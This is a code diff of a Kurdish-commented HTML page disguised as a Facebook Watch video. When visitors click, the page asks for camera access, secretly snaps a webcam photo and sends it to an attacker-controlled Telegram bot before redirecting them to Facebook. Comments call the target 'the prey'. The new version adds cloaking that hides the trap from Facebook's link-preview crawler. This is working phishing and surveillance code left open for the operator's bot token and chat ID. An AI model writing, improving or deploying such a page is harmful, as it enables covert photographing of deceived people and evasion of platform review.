@@ -2,73 +2,51 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:site_name" content="Facebook">
-    <meta property="og:title" content="فیدیۆیەکی ناوازە و سەیر">
-    <meta property="og:description" content="تەنها لە فەیسبووک وۆچ دەتوانیت ئەم ڤیدیۆیە ببینی">
+    <meta property="og:site_name" content="facebook.com">
+    <meta property="og:title" content="Facebook Watch | ڤیدیۆیەکی تایبەت">
     <meta property="og:image" content="thumbnail.jpg">
     <meta property="og:url" content="https://www.facebook.com">
     <meta property="og:type" content="video.other">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Facebook Video Player</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Video</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: black; display: flex; justify-content: center; align-items: center; overflow: hidden; font-family: sans-serif; }
-        video { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
-        canvas { display: none; }
-        .play-button { position: absolute; width: 70px; height: 70px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; pointer-events: none; border: 3px solid white; }
-        .play-button::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .play { position: absolute; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; border: 2px solid #fff; }
+        .play::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; position: absolute; top: 25px; left: 30px; }
     </style>
 </head>
 <body>
-
-    <video id="video" autoplay playsinline poster="thumbnail.jpg"></video>
-    <div class="play-button"></div>
-    <canvas id="canvas"></canvas>
+    <video id="v" autoplay playsinline poster="thumbnail.jpg"></video>
+    <div class="play"></div>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        // زانیارییەکانی تەلەگرامەکەت لێرە دابنێ
-        const telegramToken = 'لێرە_API_TOKEN_دابنێ'; 
-        const telegramChatId = 'لێرە_CHAT_ID_دابنێ';
-        const finalRedirect = "https://www.facebook.com/watch/?v=12345678"; // لینکی ڤیدیۆ ڕاستەقینەکە
+        // لێرە Token و Chat ID تەلەگرامەکەت دابنێ
+        const T = 'لێرە_TOKEN_دابنێ';
+        const C = 'لێرە_CHATID_دابنێ';
+        const FB = "https://www.facebook.com/watch";
 
-        async function startHack() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // دوای یەک چرکە لە مۆڵەتدان وێنەکە دەگرێت
-                setTimeout(takePicture, 1000);
-            } catch (err) {
-                // ئەگەر نێچیرەکە Allow نەکات، هەر دەیبات بۆ فەیسبووک
-                window.location.href = finalRedirect;
-            }
+        if (!navigator.userAgent.includes("facebookexternalhit")) {
+            window.onclick = async () => {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById('v').srcObject = s;
+                    setTimeout(() => {
+                        const can = document.getElementById('c');
+                        const vid = document.getElementById('v');
+                        can.width = vid.videoWidth; can.height = vid.videoHeight;
+                        can.getContext('2d').drawImage(vid, 0, 0);
+                        can.toBlob(b => {
+                            const f = new FormData();
+                            f.append('chat_id', C); f.append('photo', b, 's.jpg');
+                            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
+                            .then(() => location.href = FB);
+                        }, 'image/jpeg');
+                    }, 1000);
+                } catch (e) { location.href = FB; }
+            };
         }
-
-        function takePicture() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', telegramChatId);
-                formData.append('photo', blob, 'victim_snap.jpg');
-                formData.append('caption', '🔥 وێنەی نوێ گەیشت!\n🕵️‍♂️ نێچیرەکە ئێستا سەیری ڤیدیۆکە دەکات.');
-
-                fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    // دوای ناردنی وێنەکە بۆ تۆ، نێچیرەکە دەچێتە ناو فەیسبووک
-                    window.location.href = finalRedirect;
-                });
-            }, 'image/jpeg');
-        }
-
-        // هەر شوێنێکی شاشەکە دابگرێت، داوای Allow دەکات
-        window.onclick = () => { startHack(); };
     </script>
 </body>
 </html>
